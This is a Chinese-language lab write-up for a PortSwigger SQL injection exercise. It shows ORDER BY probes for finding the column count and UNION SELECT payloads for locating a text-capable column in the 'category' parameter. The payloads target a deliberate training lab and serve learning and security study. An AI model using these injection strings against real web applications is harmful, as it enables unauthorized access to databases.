---
title: "SQL injection（Lab4)"
published: 2026-10-13
description: "PortSwigger SQLi 入门：UNION 查找可塞文本的列 Lab：SQL injection UNION attack …"
category: "靶场"
---

# PortSwigger SQLi 入门：UNION 查找可塞文本的列

> Lab：[SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)  
> 原理：[Finding columns with a useful data type](https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type)

## 题目在考什么

列数定了之后，还要知道**哪一列能放字符串**。用户名、密码这类敏感数据通常是文本；列类型不兼容时，塞字符串会报错。

目标：让数据库取出 lab 给出的随机字符串（本题为 `3G5AU7`）并显示在页面上。

## 注入点

仍是类别筛选 `category`（同 Lab3）。

## 步骤

### 1\. 定列数

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

到 4 报错 → **3 列**。

### 2\. 逐列测能否塞字符串

用 `'a'` 当探针，一次只换一列：

```text
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

结果：`' UNION SELECT NULL,'a',NULL--` 页面能显示 `a`，**第二列**可放文本。

![](https://pic.npiter.de/file/1791906737999_20261013235206247.png)

### 3\. 换成题目字符串

```text
' UNION SELECT NULL,'3G5AU7',NULL--
```

页面出现 `3G5AU7`，lab 通过。

![](https://pic.npiter.de/file/1791906741475_20261013235206248.png)

## 踩坑 / 要点

-   `'a'` 只是探测；真正过关要把 lab 给的那串随机字符塞进去。
-   第一列、第三列塞字符串可能报错（类型不兼容），换下一列继续试即可。
-   `NULL` 仍作占位，保证其余列类型好通过。
